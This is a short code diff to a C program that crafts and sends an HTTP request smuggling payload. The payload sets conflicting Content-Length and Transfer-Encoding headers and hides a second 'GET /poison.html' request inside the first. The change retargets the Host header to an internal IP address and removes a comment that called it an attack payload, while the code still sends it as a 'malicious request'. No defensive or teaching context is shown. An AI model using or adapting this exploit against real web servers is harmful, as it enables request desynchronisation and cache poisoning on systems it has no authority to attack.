@@ -32,10 +32,9 @@ int main() {
         return 1;
     }
 
-    // Craft the HTTP request smuggling attack payload
     snprintf(request, sizeof(request),
         "POST / HTTP/1.1\r\n"
-        "Host: target.com\r\n"
+        "Host: 192.168.1.202\r\n"  // Adjust Host header here
         "Content-Length: 25\r\n"
         "Transfer-Encoding: chunked\r\n"
         "\r\n"
@@ -44,8 +43,9 @@ int main() {
         "0\r\n"  // End of chunked encoding
         "\r\n"  // End of the first request
         "GET /poison.html HTTP/1.1\r\n"
-        "Host: target.com\r\n"
-        "\r\n");  // Smuggled second request
+        "Host: 192.168.1.202\r\n"  // Adjust Host header here
+        "\r\n");
+
 
     // Send the malicious request
     if (send(sock, request, strlen(request), 0) < 0) {
